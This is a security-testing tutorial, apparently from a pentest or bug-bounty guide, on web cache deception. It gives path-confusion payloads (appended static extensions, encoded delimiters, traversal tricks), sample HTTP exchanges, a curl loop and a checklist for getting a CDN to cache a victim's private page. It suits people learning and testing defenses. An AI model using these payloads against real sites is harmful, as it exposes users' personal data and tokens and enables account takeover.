Web Cache Deception
Web cache deception tricks a CDN or reverse proxy into caching an authenticated user's private response as a static asset. You send the victim a link to their own account page with a fake static extension appended  -  the server returns their data, the cache stores it as a "static file," and you retrieve it unauthenticated. Unlike cache poisoning (where you poison what the cache serves to everyone), cache deception targets one victim's data at a time. The impact is information disclosure, often including PII, tokens, and CSRF tokens that chain into account takeover.
How Web Cache Deception Works
sequenceDiagram
    participant A as Attacker
    participant V as Victim
    participant CDN as CDN/Cache
    participant App as Application

    A->>V: Sends link: /account/settings/logo.png
    V->>CDN: GET /account/settings/logo.png (with cookies)
    CDN->>App: Cache MISS  -  forwards request
    App->>CDN: 200 OK  -  returns account settings HTML
    Note over CDN: .png extension triggers caching
    CDN->>V: Returns account settings page
    A->>CDN: GET /account/settings/logo.png (no cookies)
    CDN->>A: Cache HIT  -  serves victim's account data

Two conditions must be true:

The application serves authenticated content for the manipulated path (doesn't 404)
The cache treats the response as cacheable based on the path/extension

Path Confusion Techniques
The core trick is making the cache think the response is a static asset while the application still routes to the dynamic page.
Static Extension Appending
/account/settings/nonexistent.css
/account/profile/anything.js
/api/user/data/fake.png
/dashboard/test.woff2
/inbox/messages/style.css
The application ignores the appended filename (path normalization, catch-all routes, or framework behavior) and serves the authenticated page. The CDN sees .css and caches it.
Path Delimiter Confusion
Different components treat different characters as path delimiters:
/account/settings;.css          Semicolon  -  Java/Tomcat ignores after ;
/account/settings%00.css        Null byte  -  some parsers truncate
/account/settings%23.css        # (encoded)  -  fragment confusion
/account/settings/.css          Dot prefix  -  some normalize to /account/settings
/account/settings%3B.css        ; (encoded)
/account/settings%3F.css        ? (encoded)
The application routes based on /account/settings (before the delimiter). The CDN routes based on the full path and sees a .css extension.
Path Normalization Differences
/account/settings/..%2F..%2Fstatic/logo.png
/account/settings/%2e%2e/static/logo.png
/static/../account/settings
If the CDN normalizes paths differently than the application, you can make the CDN see a "static" path while the app resolves to a dynamic route.

Testing Methodology
Step 1: Find an Authenticated Endpoint with Sensitive Data
Browse the target while authenticated. Identify pages that return PII, tokens, or account-specific data:
/account/settings
/api/me
/profile
/dashboard
/inbox
/billing
Step 2: Test Path Confusion
Append a static extension and check if the application still returns authenticated content:
GET /account/settings/test.css HTTP/1.1
Host: target.com
Cookie: session=abc123
 
HTTP/1.1 200 OK
Content-Type: text/html       ← Still returns HTML, not CSS
X-Cache: MISS                 ← Not yet cached
 
... account settings data with PII ...
If you get a 200 with the same content, the application doesn't care about the appended path.
Step 3: Verify Caching
Send the same request again and check for cache hit:
GET /account/settings/test.css HTTP/1.1
Host: target.com
Cookie: session=abc123
 
HTTP/1.1 200 OK
X-Cache: HIT                  ← Cached!
Age: 5
CF-Cache-Status: HIT          ← Cloudflare-specific header
Step 4: Retrieve Unauthenticated
Open a private/incognito browser (no cookies) and request the same URL:
GET /account/settings/test.css HTTP/1.1
Host: target.com
 
HTTP/1.1 200 OK
X-Cache: HIT
 
... victim's account settings data ...
If you see the authenticated user's data  -  that's the vulnerability.
Step 5: Document the Impact
What sensitive data is exposed? Common findings:

Full name, email, phone number, address
CSRF tokens (chain to CSRF attacks)
API keys or session tokens (chain to account takeover)
Internal user IDs (chain to IDOR)
Billing information, subscription status

Automation
# Test multiple extensions against an authenticated endpoint
for ext in css js png jpg gif woff2 svg ico; do
  echo "Testing .$ext:"
  curl -s -o /dev/null -w "%{http_code} %{size_download}" \
    -H "Cookie: session=abc123" \
    "target.com/account/settings/test.$ext"
  echo ""
done
 
# Check cache headers specifically
curl -v "target.com/account/settings/test.css" 2>&1 | grep -i "x-cache\|cf-cache\|age:\|cache-control"
Checklist

 Identify authenticated endpoints that return sensitive data in the response body
 Test static extension appending: .css, .js, .png, .jpg, .woff2, .svg
 Test path delimiter confusion: ;.css, %00.css, %23.css
 Test path normalization differences: ..%2F, %2e%2e
 Check response headers for caching indicators: X-Cache, CF-Cache-Status, Age
 Verify the response is actually cached (request twice, check for HIT)
 Retrieve the cached response from an unauthenticated session
 Document what sensitive data is exposed in the cached response
 Test across multiple authenticated endpoints  -  not just one
 Check if the cache key includes cookies or Vary: Cookie header (which would prevent the attack)
